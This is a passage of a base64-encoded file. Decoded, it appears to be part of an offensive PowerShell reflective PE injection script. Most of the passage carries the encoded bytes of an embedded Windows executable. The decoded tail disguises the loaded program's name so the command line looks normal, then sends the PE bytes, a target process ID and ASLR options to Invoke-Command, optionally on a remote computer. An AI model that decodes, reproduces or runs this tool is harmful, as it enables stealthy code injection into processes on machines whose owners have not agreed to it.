JQ0E4ZEhKMWMzUkpibVp2SUhodGJHNXpQU0oxY200NmMyTm9aVzFoY3kxdGFXTnliM052Wm5RdFkyOXRPbUZ6YlM1Mk15SStEUW9nSUNBZ1BITmxZM1Z5YVhSNVBnMEtJQ0FnSUNBZ1BISmxjWFZsYzNSbFpGQnlhWFpwYkdWblpYTStEUW9nSUNBZ0lDQWdJRHh5WlhGMVpYTjBaV1JGZUdWamRYUnBiMjVNWlhabGJDQnNaWFpsYkQwbllYTkpiblp2YTJWeUp5QjFhVUZqWTJWemN6MG5abUZzYzJVbklDOCtEUW9nSUNBZ0lDQThMM0psY1hWbGMzUmxaRkJ5YVhacGJHVm5aWE0rRFFvZ0lDQWdQQzl6WldOMWNtbDBlVDROQ2lBZ1BDOTBjblZ6ZEVsdVptOCtEUW84TDJGemMyVnRZbXg1UGcwS0FBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUVBQUF1QUFBQUNRd3NURHFNTjR4N1RGaE1uY3lqaktXTXFFeXFESzdNc2t5Q1RNMk16c3pVak5iTTJVemt6TWdOSTgwb0RUS05NODAyelFITlJNMUp6bWlPYmc1NHpudk9RYzZGVG9lT2pJNk56cERPbGM2YURxQk9vNDZtVHFlT3E0NjdEcjJPdjg2RHpzVU94azdIanNxTzBBN2Z6dXlPOE03M3p2M093RThRVHhjUEdJOG1UeTlQTlE4NFR6clBBRTlEajBoUFM0OWF6MmZQY285K0QwSFBpVStMajQwUGtZK2VENm9QckkrVEQ5VFB3QUFBQ0FBQUNRQkFBQUFNQzh3UHpCV01HY3dlREI5TUpZd216Q29NUFV3RWpFY01Tb3hQREZSTVk4eGFES2JNdWt5OGpMOU1nUXpKRE1xTXpBek5qTThNMEl6U1ROUU0xY3pYak5sTTJ3emN6TjdNNE16aXpPWE02QXpwVE9yTTdVenZ6UFBNOTh6N3pQNE14NDBPRFErTkZjMGNUUjNOSWMwclRURU5QVTBFalVvTllVMU5UWm1OclUyeURiYk51YzI5ellJTnk0M1F6ZEtOMUEzWWpkc044MDMyamNCT0FrNElqaGNPSGM0Z3ppU09KczRxRGpYT044NDZqandPUFk0QWprbE9WWTVBVG9nT2lvNk96cEhPbEE2VlRwN09vQTZwVHF4T3M0NkZ6c3pPMEU3WER0bk8vWTcvenNIUEU0OFhUeGtQSm84b3p5d1BMczh4RHpUUE9vOEJqMExQUm85ZkQyTFBSVStNRDVKUHFzKzZENEJQeHMvTXo5bVAyNC9najhBQUFBd0FBQklBQUFBSnpCQk1FY3dUekFMTWpnMmpqWXhPSW80SERsdk9aTTY5RHdMUFNZOVNUMVpQWEU5bkQzQ1BlVTk5VDBOUGpnK1dqNW9QdGcrV1Q5aFAzTS94RC9zUHdCQUFBQ1VBQUFBckREOU1MNHhGVElvTXFBeVFUTmhNNnN6d3pQSU16TTBOalZITldRM2R6ZVZONk0zVVRtSU9ZODVsRG1ZT1p3NW9EbjJPVHM2UURwRU9rZzZURHF2UE1RODNqd0dQUlE5R2owdlBVczlYVDFvUFgwOWh6MlZQYkE5d1QwZ1BqTStSejVUUG84K256NjJQcjQrNkQ0RVB4TS9Iejh0UDA4L1h6OWtQMmsvbnora1A2ay80ai9uUCt3L0FBQUFVQUFBc0FBQUFCd3dJVEFtTUdVd2FqQnZNSll3bnpDa01La3d6VERaTU40dzR6QUhNUk14R0RFZE1VUXhVREZWTVZveGlqR1NNWjB4cWpIQU1kSXgzakVGTWhFeUtETlJNMjB6alRPYk02SXpxRE82TTh3ejBUUHNNMUUwWFRUVk5PODArRFFZTlRJMVFUVlBOVnMxWnpWMU5ZVTFtald4TmRRMTZUWC9OUXcyR2pZb05qTTJTVFpkTm1ZMjhEbjVPUUU2bnpxK085QTdDVDJWUFprOW5UMmhQYVU5cVQydFBiRTkyajhBQUFCZ0FBQjhBQUFBYWpLR01vb3lqaktTTXBZeW1qS2VNcUl5cGpLcU1xNHlzaklFTTFrM2RUZWtPYlk1MGpuMk9SRTZIRHBZT293NnN6ck5PaDQ3VWp4b1BKODh6enplUFBROENqMGhQU2c5TkQxSFBVdzlXRDFkUFc0OTJEM2ZQZkU5K2oxQ1BsUStYRDVtUG04K2dENlNQcTArMlQ3Z1BoTS9HRDhBY0FBQWdBQUFBRDR3VmpDRE1KNHczekRrTU80dzh6RCtNQWt4SFRGdU1SSXlKVEkwTWxVeXJqSzVNZ2d6SUROcU13QTBGelNWTk5rMDZ6UWhOU1kxTXpVL05WZzFheldlTmEwMXNqWEROY2sxMURYY05lYzE3VFg0TmY0MUREWVZOaG8yT2pZL05tQTJmVFlGTndzM0hUZGJOMkUzampmN053RTQ0ejhBQUFDQUFBRGtBQUFBMFREYk1PZ3dHekV0TVYweGVqR0ZNZGN4M2pIeE1TRXlWREpuTW40eWhqTENNdEl5NlRMeE1oZ3pNVE5BTTB3eldqTjhNNDR6bVRPZU02TXp2alBJTStRejd6UDBNL2t6RkRRZU5EbzBSVFJLTkU4MGFqUjBOSkEwbXpTZ05LVTB3elROTk9rMDlEVDVOUDQwSHpVdk5VczFWalZiTldBMWt6VzNOZE0xM2pYak5lZzFCallwTmpRMlFUWldObUUyZFRaNk5uODJvVGF2TnI0MjRqYjBOZ0EzRGpjdk56WTNURGRpTjI4M2REZUNOMlE0Z3ppSU9JVTV2am51T1FrNlJEcDdPbzA2d3pybU9rQTdVRHVqTzcwN1VUMVlQbzQrcXovSFB3Q1FBQUJnQUFBQUd6RE9NUjR5VHpKL01zb3l4alBhTTFZMER6VVdOVDQxV0RWdk5YWTFxelc4TmRjMTR6WDBOZjAxTWpaRE5sMDJaalp6Tm4wMm56YXdOc1UyenpieU52dzI3enU2UHZrK0FEOFFQeDgvSmo4K1AwVS9ZejhBQUFDZ0FBREVBQUFBWWpHU01jUXhFekxRTXRzeUZ6TXBNeTh6MURQZk0ra3o3ek1ETkE4ME16Uk1OSGswZ0RTTE5KazBvRFNtTk1FMHlEVFJORXMxV2pWc05YNDFtalc0TmNJMTB6WFlOZTAxSURZbk5pNDJOVFpQTmw0MmFEWjFObjgyanpibk5oODNPamRNT1hrNW1qbWZPYW81dmpuSk9lQTVFRG9sT2pNNlBEcHhPcWc2M2pyeE9vTTd0enZlT3lrOEhEMC9QV1U5aHowT1BoVStIejRwUGk0K05ENDVQa2MrYXo2ZlBzbys3RDRUUHpFL1BEKzVQOEEveHovT1A5cy9BQUFBc0FBQW1BQUFBQnd3S1RBMk1FTXdXakFoTVo0eHB6Ry9NZEV4L2pFc01tQXlhREtCTXBNeW56S25Ncjh5MWpJb00wb3phVE5rTk9NMEVEV1ROUk0yUmpaYk5tdzI4allJTjBnM1pEZURON00zUHpoZU9KYzR2ampKT05rNFVEbUhPYVk1dkRuR09lVTVBenB5T3BzNnhEcmlPbUE3aVR1eU84NDdWenlGUExZODBqd0ZQU0k5UkQzRFBSOCt2ejR1UHpnL2hqOEFBQURBQUFCTUFBQUFYakI0TUxnd3h6RFZNUEl3K2pBak1Tb3hSakZOTVdReGVqRzFNYnd4RERJZ01vOHk0ekpwTTJNMFZqV2pOWHMyNURZT056MDNvemZjTi9JM0V6aUxPRW8rdGo0QTBBQUFIQUFBQUlrMmtUYklOczgyK1RudU92WTZMVHMwT3prK0FPQUFBSUFBQUFCOU1ZUXhpekdTTVg0MGhUUlFOVmMxMWpYcU5TSTJORFpHTmxnMmFqWjhObzQyb0RheU5zUTIxamJvTnZvMkd6Y3ROejgzVVRkak41dzQ0amhyT1gwNTVqbnNPVXM2VVRwZU9wRTZMenRGTzU4NzNEdm1Pd0U4WGp5UlBMRTgyenliUGFVOXp6MGJQaW8rU1Q1YVBqSS9jai9kUC9jL0FBQUE4QUFBakFBQUFBUXdOREJZTUdNd2NEQ0NNTW93NHpCbk1Yd3hoVEdPTWFReENUSVBNaFF5R2pJck11ZzBMVFVKTm9rMnpUYWtOK2szOFRmNU53RTRDVGduT0M4NGtUaWRPTEU0dlRqSk9PazRNRGxhT1dJNWZ6bVBPWnM1cWptdU90ODZJVHRZTzNVN2lUdVVPK0U3YVR6UVBJVTkrVDBXUGlZK2V6NThQNHcvblQrbFA3VS94ajhBQUFBQUFRQmNBQUFBTERBM01FSXdTREJSTUpNd3ZqRGpNTzh3K3pBT01TMHhXREZ3TWJVeHdUSE5NZGt4N0RFUU1wQXlzalBFTTlZelJqU25OQUkxY0RXUE5jQTFGVGRQT0dvNGdEaVdPSjQ0OXp2NlBBczlraitZUDU0L0FCQUJBRlFBQUFBYU1FNHdoVEFHTVFzeEhURTdNVTh4VlRHaE1yNHlralN1TklRMWx6VzFOY00xY1Rlb042ODN0RGU0Tjd3M3dEY1dPRnM0WURoa09HZzRiRGpXT2hJOFh6MjVQUVkrSVQ0eFBqYytBQ0FCQUdnQkFBQlFNVmd4WkRGb01Xd3hlREY4TVlBeGxER1lNWnd4b0RHa01id3h3REhFTWRneDNESGdNZnd4QURJRU1nZ3lERElRTWhReUtESjBNbmd5ZkRLQU12QXo5RFA0TS93ekFEUUVOQWcwRERRUU5CUTBHRFFjTkNBMEpEUW9OQ3cwTURRME5EZzBQRFJBTkVRMFNEUk1ORkEwVkRSWU5GdzBZRFJrTkdnMGJEUndOSFEwZURSOE5JQTBoRFNJTkl3MGtEU1VOSmcwbkRTZ05LUTBxRFNzTkxBMHREUzROTHcwd0RURU5NZzB6RFRRTk5RMDJEVGNOT0EwNURUb05PdzA4RFQwTlBnMC9EUUFOUVExQ0RVTU5SQTFGRFVZTlJ3MUlEVWtOU2cxTERVd05UUTFPRFU4TlVBMVJEVklOVXcxVURWVU5WZzFYRFZnTldRMWFEVnNOWEExZERWNE5YdzFlRHlBUElnOGpEeVFQSlE4bUR5Y1BLQThwRHlzUExBOHREeTRQTHc4d0R6RVBNZzgxRHpjUE9BODVEem9QT3c4V0Q1Y1BtQStaRDVvUG13K2NENTBQbmcrZkQ2QVBvUStpRDZNUHBBK2xENllQcHcrb0Q2a1BnQUFBREFCQU1BQUFBQVlOeHczSURja055ZzNMRGN3TnpRM09EYzhOMEEzUkRkSU4wdzNVRGRVTjFnM1hEZGdOMlEzYURkc04zQTNkRGQ0TjN3M2dEZUVONGczakRlUU41UTNtRGVjTjZBM3BEZW9ONnczc0RlME43ZzN2RGZBTjh3MzBEZlVOOWczM0RmZ04rUTM2RGZzTi9BMzlEZjROL3czQURnRU9BZzRERGdRT0JRNEdEZ2NPQ0E0SkRnb09DdzRNRGcwT0RnNFBEaEFPRVE0U0RoTU9GQTRWRGhZT0Z3NFlEaGtPR2c0YkRod09IUTRlRGg4T0lBNGhEaUlPQUFBQUVBQkFOQUJBQURNTU5RdzNERGtNT3d3OUREOE1BUXhEREVVTVJ3eEpERXNNVFF4UERGRU1Vd3hWREZjTVdReGJERjBNWHd4aERHTU1aUXhuREdrTWF3eHRERzhNY1F4ekRIVU1kd3g1REhzTWZReC9ERUVNZ3d5RkRJY01pUXlMREkwTWp3eVJESk1NbFF5WERKa01td3lkREo4TW9ReWpES1VNcHd5cERLc01yUXl2RExFTXN3eTFETGNNdVF5N0RMME12d3lCRE1NTXhRekhETWtNeXd6TkRNOE0wUXpURE5VTTF3elpETnNNM1F6ZkRPRU00d3psRE9jTTZRenJETzBNN3d6eERQTU05UXozRFBrTSt3ejlEUDhNd1EwRERRVU5CdzBKRFFzTkRRMFBEUkVORXcwVkRSY05HUTBiRFIwTkh3MGhEU01OSlEwbkRTa05LdzB0RFM4Tk1RMHpEVFVOTncwNURUc05QUTAvRFFFTlF3MUZEVWNOU1ExTERVME5UdzFSRFZNTlZRMVhEVmtOV3cxZERWOE5ZUTFqRFdVTlp3MXBEV3NOYlExdkRYRU5jdzExRFhjTmVRMTdEWDBOZncxQkRZTU5oUTJIRFlrTml3Mk5EWThOa1EyVERaVU5sdzJaRFpzTm5RMmZEYUVOb3cybERhY05xUTJyRGEwTnJ3MnhEYk1OdFEyM0Ria051dzI5RGI4TmdRM0REY1VOeHczSkRjc056UTNQRGRFTjB3M1ZEZGNOMlEzYkRkME4zdzNoRGVNTjVRM25EZWtONnczdERlOE44UTN6RGZVTjl3MzVEY0FVQUVBMEFFQUFQQXgrREVBTWdneUVESVlNaUF5S0RJd01qZ3lRREpJTWxBeVdESmdNbWd5Y0RKNE1vQXlpREtRTXBneW9ES29NckF5dURMQU1zZ3kwRExZTXVBeTZETHdNdmd5QURNSU14QXpHRE1nTXlnek1ETTRNMEF6U0ROUU0xZ3pZRE5vTTNBemVET0FNNGd6a0RPWU02QXpxRE93TTdnendEUElNOUF6MkRQZ00rZ3o4RFA0TXdBMENEUVFOQmcwSURRb05EQTBPRFJBTkVnMFVEUllOR0EwYURSd05IZzBnRFNJTkpBMG1EU2dOS2cwc0RTNE5NQTB5RFRRTk5nMDREVG9OUEEwK0RRQU5RZzFFRFVZTlNBMUtEVXdOVGcxUURWSU5WQTFXRFZnTldnMWNEVjROWUExaURXUU5aZzFvRFdvTmJBMXVEWEFOY2cxMERYWU5lQTE2RFh3TmZnMUFEWUlOaEEyR0RZZ05pZzJNRFk0TmtBMlNEWlFObGcyWURab05uQTJlRGFBTm9nMmtEYVlOcUEycURhd05yZzJ3RGJJTnRBMjJEYmdOdWcyOERiNE5nQTNDRGNRTnhnM0lEY29OekEzT0RkQU4wZzNVRGRZTjJBM2FEZHdOM2czZ0RlSU41QTNtRGVnTjZnM3NEZTROOEEzeURmUU45ZzM0RGZvTi9BMytEY0FPQWc0RURnWU9DQTRLRGd3T0RnNFFEaElPRkE0V0RoZ09HZzRjRGg0T0lBNGlEaVFPSmc0b0Rpb09MQTR1RGpBT01nNDBEallPT0E0NkRqd09QZzRBRGtJT1FCZ0FRQVFBQUFBNmp6dVBQSTg5andBY0FFQVJBQUFBSXcybERhY05xUTJyRGEwTnJ3MnhEYk1OdFEyM0Ria051dzI5RGI4TmdRM0REY1VOeHczSkRjc056UTNQRGRFTjB3M1ZEZGNOMlEzYkRjQUFBQ3dBUUFvQUFBQVpEOW9QM0Eva0QrVVA2US9xRCt3UDhnLzJEL2NQK3cvOEQvMFAvdy9BQUFBd0FFQTlBQUFBQlF3SkRBb01EZ3dQREJBTUVRd1REQmtNSFF3ZURDSU1Jd3dsRENzTUx3d3dERFFNTlF3MkREZ01QZ3dYRFZvTll3MXJEVzBOYncxeERYTU5kUTE0RFVBTmdnMkVEWVlOaUEyUURaZ05udzJnRGFJTnBBMm1EYWNOcVEydURiQU50UTIzRGJrTnV3MjhEYjBOdncyRURjc056QTNURGRRTjFnM1lEZG9OM0EzaERlZ042ZzNyRGZJTjlBMzFEZnNOL0EzRERnUU9DQTRSRGhRT0ZnNGhEaUlPSkE0bURpZ09LUTRyRGpBT09BNEFEa2dPU2c1TERsSU9XZzVoRG1JT2FnNXlEblVPZkE1RURvd09sQTZjRHFRT3JBNjBEcndPaEE3TUR0UU8zQTdrRHV3TzlBNzhEc01QQkE4QU9BQkFGd0FBQUFVTUN3d1lEQ0FNYkF4d0RIUU1lQXg4REVJTWhReUdESWNNamd5UERKZ04yUTNlRGQ4TjRBM2hEZUlONHcza0RlVU41ZzNuRGVvTjZ3M3NEZTBON2czdkRmQU44UTM4RGNNT0NnNFVEacKCiAgICAjQWRkIGEgInByb2dyYW0gbmFtZSIgdG8gZXhlYXJncywganVzdCBzbyB0aGUgc3RyaW5nIGxvb2tzIGFzIG5vcm1hbCBhcyBwb3NzaWJsZSAocmVhbCBhcmdzIHN0YXJ0IGluZGV4aW5nIGF0IDEpCiAgICBpZiAoJEV4ZUFyZ3MgLW5lICRudWxsIC1hbmQgJEV4ZUFyZ3MgLW5lICcnKQogICAgewogICAgICAgICRFeGVBcmdzID0gIlJlZmxlY3RpdmVFeGUgJEV4ZUFyZ3MiCiAgICB9CiAgICBlbHNlCiAgICB7CiAgICAgICAgJEV4ZUFyZ3MgPSAiUmVmbGVjdGl2ZUV4ZSIKICAgIH0KICAgIAogICAgW1N5c3RlbS5JTy5EaXJlY3RvcnldOjpTZXRDdXJyZW50RGlyZWN0b3J5KCRwd2QpCgogICAgaWYgKCRDb21wdXRlck5hbWUgLWVxICRudWxsIC1vciAkQ29tcHV0ZXJOYW1lIC1pbWF0Y2ggIl5ccyokIikKICAgIHsKICAgICAgICBJbnZva2UtQ29tbWFuZCAtU2NyaXB0QmxvY2sgJFJlbW90ZVNjcmlwdEJsb2NrIC1Bcmd1bWVudExpc3QgQCgkUEVCeXRlczY0LCAkUEVCeXRlczMyLCAkRnVuY1JldHVyblR5cGUsICRQcm9jSWQsICRQcm9jTmFtZSwkRm9yY2VBU0xSLCAkUG9zaENvZGUpCiAgICB9CiAgICBlbHNlCiAgICB7CiAgICAgICAgSW52b2tlLUNvbW1hbmQgLVNjcmlwdEJsb2NrICRSZW1vdGVTY3JpcHRCbG9jayAtQXJndW1lbnRMaXN0IEAoJFBFQnl0ZXM2NCwgJFBFQnl0ZXMzMiwgJEZ1bmNSZXR1cm5UeXBlLCAkUHJvY0lkLCAkUHJvY05hbWUsJEZvcmNlQVNMUiwgJFBvc2hDb2RlKSAtQ29tcHV0ZXJOYW1lICRDb21wdXRlck5hbWUKICAgIH0KfQoKTWFpbgp9Cgo=
